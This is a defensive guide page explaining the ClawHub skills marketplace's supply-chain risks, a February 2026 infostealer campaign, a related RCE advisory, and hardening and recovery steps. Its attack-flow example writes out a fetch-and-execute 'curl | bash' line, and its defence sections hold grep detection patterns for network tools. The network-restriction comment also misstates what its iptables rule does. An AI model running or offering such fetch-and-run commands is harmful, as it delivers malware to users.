# ClawHub Marketplace: Supply Chain Security Risks

> **Time:** 10 minutes
> **Difficulty:** Beginner-friendly with practical examples
> **Severity:** CRITICAL (due to scale of Feb 2026 campaign)

---

## Table of contents (Explain OpenClaw)

- [Home (README)](../README.md)
- Plain English
  - [What is OpenClaw?](../01-plain-english/what-is-clawdbot.md)
  - [Glossary](../01-plain-english/glossary.md)
- Technical
  - [Architecture](../02-technical/architecture.md)
  - [Repo map](../02-technical/repo-map.md)
- Privacy + safety
  - [Threat model](../04-privacy-safety/threat-model.md)
  - [Hardening checklist](../04-privacy-safety/hardening-checklist.md)
- Worst-case security
  - [Overview](./README.md)
  - [Mac Mini risks](./mac-mini-risks.md)
  - [VPS risks](./vps-risks.md)
  - [Moltworker risks](./moltworker-risks.md)
  - [Cross-cutting vulnerabilities](./cross-cutting.md)
  - [ClawHub marketplace risks](./clawhub-marketplace-risks.md) (this page)
  - [Prompt injection attacks](./prompt-injection-attacks.md)
  - [Misconfiguration examples](./misconfiguration-examples.md)
- Reference
  - [Commands + troubleshooting](../99-reference/commands-and-troubleshooting.md)

---

## A. What Is ClawHub?

### Overview

ClawHub is an unofficial third-party skills marketplace for OpenClaw. Key characteristics:

- **Open publishing:** Anyone with a GitHub account at least 1 week old can publish skills
- **No sandboxing:** Skills are executable code that runs in-process with the Gateway
- **Minimal vetting:** No code review before publishing; reactive moderation only
- **Full access:** Skills have the same filesystem and network access as the Gateway itself

### The Trust Model (plain English analogy)

> **The Analogy:** Imagine an "app store" where anyone can upload software, there's no review process, and every app you install gets full admin access to your computer. That's ClawHub.

| Platform | Review Process | Sandboxing | Risk Level |
|----------|---------------|------------|------------|
| Apple App Store | Manual human review | Yes (strict) | Low |
| Google Play | Automated + manual | Yes (moderate) | Medium |
| npm registry | None | None | Medium-High |
| ClawHub | None | None | High |

**Key difference:** When you install an npm package, it runs during install but not continuously. A ClawHub skill runs in-process with your Gateway, with full access to credentials, sessions, and tools.

---

## B. The ClawHavoc Campaign (Feb 2026)

### 341 Malicious Skills Discovered

In February 2026, security researchers at Koi Security performed a comprehensive audit of ClawHub and discovered a coordinated attack campaign.

**Scale of the problem:**

| Metric | Value |
|--------|-------|
| Total skills audited | 2,857 |
| Malicious skills found | 341 |
| Infection rate | 12% |
| Primary payload | Atomic Stealer (AMOS) |
| Secondary targets | Windows keyloggers/trojans |

### How the Attack Worked

The attackers did NOT exploit code vulnerabilities. Instead, they used social engineering:

1. **Professional appearance:** Skills had polished documentation and legitimate-looking functionality
2. **Fake prerequisites:** Documentation included a "Prerequisites" section instructing users to run terminal commands
3. **ClickFix-style attack:** Users copy-paste commands that download and execute malware
4. **Persistence:** Malware installs as background process, survives reboots

**Example attack flow:**

```
User finds "solana-wallet-tracker" skill on ClawHub
  ↓
Readme says: "Prerequisites: Run this to install dependencies"
  ↓
User runs: curl -fsSL https://glot.io/snippets/xyz | bash
  ↓
Script downloads Atomic Stealer from attacker server
  ↓
Malware silently harvests all credentials
```

### What the Malware Stole

Atomic Stealer (AMOS) is a sophisticated macOS infostealer. Once installed, it harvests:

| Category | Specific Targets |
|----------|------------------|
| **Cryptocurrency** | 60+ wallet types (MetaMask, Phantom, Coinbase, Ledger, etc.) |
| **Browsers** | Passwords, cookies, autofill data, sessions |
| **Developer** | SSH keys, `.env` files, API credentials |
| **System** | macOS Keychain, iCloud Keychain |
| **Messaging** | Telegram session tokens, Discord tokens |
| **OpenClaw-specific** | `~/.openclaw/credentials/*`, channel tokens |

### Disguises Used by Malicious Skills

The 341 skills used various disguises to appear legitimate:

| Category | Examples | Target Audience |
|----------|----------|-----------------|
| **ClawHub typosquats** | `clawhub1`, `clawhubb`, `cllawhub`, `c1awhub` | Everyone |
| **Crypto tools** | `solana-wallet-tracker`, `polymarket-trader`, `eth-gas-tracker` | Crypto users |
| **YouTube utilities** | `yt-summarizer`, `thumbnail-grabber`, `transcript-downloader` | Content creators |
| **Finance** | `yahoo-finance-pro`, `stock-alerts`, `portfolio-tracker` | Traders |
| **AI utilities** | `gpt-enhancer`, `claude-helper`, `prompt-optimizer` | Developers |

---

## C. Structural Security Weaknesses

### No Sandboxing

Unlike browser extensions or mobile apps, ClawHub skills have no isolation:

```
┌─────────────────────────────────────────────────────┐
│                  OpenClaw Gateway                    │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  │
│  │  Core       │  │  Skill A    │  │  Skill B    │  │
│  │  Runtime    │  │  (trusted)  │  │  (malicious)│  │
│  └─────────────┘  └─────────────┘  └─────────────┘  │
│         ↕                ↕                ↕          │
│  ┌─────────────────────────────────────────────────┐ │
│  │  SHARED PROCESS SPACE - Full access to:        │ │
│  │  - All credentials (~/.openclaw/credentials/)  │ │
│  │  - All sessions (~/.openclaw/sessions/)        │ │
│  │  - Network (can make any outbound request)     │ │
│  │  - Filesystem (user's home directory)          │ │
│  └─────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────┘
```

**What this means:** A malicious skill can read your API keys, impersonate your bot, and exfiltrate data without any OS-level barriers.

### Minimal Vetting

ClawHub's moderation model is reactive, not proactive:

| Control | Implementation | Effectiveness |
|---------|---------------|---------------|
| Publishing requirements | GitHub account >= 1 week | Trivial to bypass |
| Code review | None before publishing | Zero prevention |
| Automated scanning | Basic pattern matching | Easily evaded |
| Reporting | 3+ reports triggers review | Slow response |
| Takedown | Manual after report | Damage already done |

### The "Lethal Trifecta" (AI Agent Risk)

Security researchers have identified three conditions that, when combined, create critical risk:

1. **Access to private data:** OpenClaw skills can read credentials, files, and sessions
2. **Exposure to untrusted content:** Skills process user messages and external data
3. **Ability to communicate externally:** Skills can make network requests

When all three exist without sandboxing, a single compromised skill can exfiltrate everything.

---

## D. Additional Vulnerabilities

### CVE-2026-25253 (1-click RCE)

In January 2026, a critical vulnerability was discovered that amplified ClawHub risks:

| Field | Value |
|-------|-------|
| CVE | CVE-2026-25253 |
| CVSS | 8.8 (High) |
| Type | Remote Code Execution |
| Vector | Malicious link |
| Fixed in | OpenClaw 2026.1.29 |

**Attack chain:**

```
Victim clicks malicious link
  ↓
Link exploits gatewayUrl token exfiltration (GHSA-g8p2-7wf7-98mq)
  ↓
Attacker gains gateway token
  ↓
Attacker installs malicious skill remotely
  ↓
Full system compromise
```

This vulnerability made ClawHub attacks particularly dangerous because attackers could install skills without user interaction.

### Exposed Admin Interfaces

Researchers found hundreds of misconfigured OpenClaw instances with:

- Public internet exposure (no `gateway.bind: "loopback"`)
- No authentication (`gateway.auth.enabled: false`)
- Dashboard accessible to anyone
- Full access to install skills, read sessions, and execute commands

**Shodan search:** Exposed instances can be found within hours of deployment.

---

## E. Practical Defenses

### Before Installing Any Skill

```bash
# 1. Check skill reputation and age
# - Avoid skills less than 30 days old
# - Verify publisher has legitimate history
# - Check for typosquatting (compare to official names)

# 2. Read the code, not just the docs
# Skills are folders in ~/.openclaw/skills/
ls -la ~/.openclaw/skills/<skill-name>/
cat ~/.openclaw/skills/<skill-name>/index.ts

# 3. Inspect for red flags:
# - Network calls to unknown domains
# - eval() or Function() usage
# - Base64-encoded strings
# - References to glot.io, pastebin, raw GitHub gists
grep -r "eval\|Function\|fetch\|axios\|http" ~/.openclaw/skills/<skill-name>/

# 4. NEVER run "prerequisite" commands blindly
# Legitimate skills install via openclaw, not curl | bash
```

### Use Koi Security Scanner

Koi Security released a free tool to check skills:

1. Go to [koi.ai/clawhub-scanner](https://koi.ai/clawhub-scanner) (example URL)
2. Paste the ClawHub skill URL
3. Review the safety report before installing

The scanner checks for:
- Known malicious signatures
- Suspicious network patterns
- Obfuscated code
- Package age and publisher history

### Environment Hardening

For maximum safety when testing skills:

```bash
# Option 1: Run OpenClaw in a VM
# - Snapshot before installing any skill
# - Restore snapshot if compromised

# Option 2: Use a container
docker run -it --rm \
  -v ~/.openclaw-test:/root/.openclaw \
  node:22 bash

# Option 3: Use a dedicated user account
sudo useradd -m openclaw-test
sudo -u openclaw-test openclaw onboard

# Option 4: Restrict network egress (Linux)
# Only allow connections to known-good destinations
iptables -A OUTPUT -m owner --uid-owner openclaw -j DROP
```

### What NOT to Do

| Bad Practice | Why It's Dangerous |
|--------------|-------------------|
| Run prerequisite commands | May download malware |
| Install skills from DM links | Likely phishing |
| Trust high download counts | Can be faked/botted |
| Skip code review for "simple" skills | Complexity != safety |
| Ignore typos in skill names | Primary attack vector |

---

## F. Recovery If Compromised

### Immediate Actions

If you suspect a malicious skill was installed:

```bash
# 1. Stop the gateway immediately
pkill -9 -f openclaw-gateway

# 2. Disconnect from network
# - Physically unplug Ethernet
# - Disable WiFi
# This prevents further exfiltration

# 3. Check for suspicious processes
ps aux | grep -E "(curl|wget|nc|python|node)" | grep -v grep

# 4. Check for persistence mechanisms (macOS)
launchctl list | grep -v "com.apple"
ls -la ~/Library/LaunchAgents/
ls -la /Library/LaunchAgents/

# 5. Scan for malware
# - Use Malwarebytes, ClamAV, or vendor tool
# - Check for Atomic Stealer indicators
```

### Credential Rotation Checklist

After any suspected compromise, rotate ALL credentials:

- [ ] **AI Provider API Keys**
  - [ ] Anthropic: [console.anthropic.com](https://console.anthropic.com)
  - [ ] OpenAI: [platform.openai.com](https://platform.openai.com)
  - [ ] Google AI: Cloud Console
  - [ ] Any other providers

- [ ] **Channel Tokens**
  - [ ] Telegram: @BotFather -> /revoke
  - [ ] Discord: Developer Portal -> Regenerate
  - [ ] Slack: Workspace Admin -> Revoke
  - [ ] WhatsApp: Phone app -> Log out all sessions

- [ ] **Developer Credentials**
  - [ ] SSH keys: Generate new keypairs, revoke old from all servers
  - [ ] GitHub tokens: Settings -> Tokens -> Revoke all
  - [ ] AWS/GCP/Azure: Rotate all access keys

- [ ] **Cryptocurrency** (URGENT if you have any)
  - [ ] Move all funds to fresh wallets immediately
  - [ ] Hardware wallets: Check for unauthorized transactions
  - [ ] Do NOT reuse seed phrases

- [ ] **Browser Sessions**
  - [ ] Log out of all services
  - [ ] Clear all cookies
  - [ ] Reset important passwords (email, banking)

---

## Code References

| Control | Source File | Notes |
|---------|-------------|-------|
| Plugin loading | `src/plugins/loader.ts` | In-process execution, no sandbox |
| Install flow | `src/commands/install-plugin.ts` | Runs npm install in plugin dir |
| Skill validation | N/A | No built-in validation |
| Skill registry | External (ClawHub) | Not in OpenClaw codebase |

Note: ClawHub is a third-party service, not part of the OpenClaw codebase. The risks documented here stem from the design decision to run skills in-process without sandboxing.

---

## Cited Sources

- [The Hacker News - 341 Malicious ClawHub Skills](https://thehackernews.com/2026/02/researchers-find-341-malicious-clawhub.html)
- [Koi Security - ClawHavoc Report](https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting)
- [BleepingComputer - MoltBot Skills Malware](https://www.bleepingcomputer.com/news/security/malicious-moltbot-skills-used-to-push-password-stealing-malware)
- [Tom's Hardware - ClawHub Crypto Targeting](https://www.tomshardware.com/tech-industry/cyber-security/malicious-moltbot-skill-targets-crypto-users-on-clawhub)
- [Official CVE-2026-25253 Advisory](https://github.com/openclaw/openclaw/security/advisories/GHSA-g8p2-7wf7-98mq)

---

## Related Documentation

- [Cross-Cutting Vulnerabilities](./cross-cutting.md) - Supply chain risks section
- [Threat Model](../04-privacy-safety/threat-model.md) - Plugin/extension risks
- [Hardening Checklist](../04-privacy-safety/hardening-checklist.md) - Plugin safety guidance
- Official security docs: https://docs.openclaw.ai/gateway/security
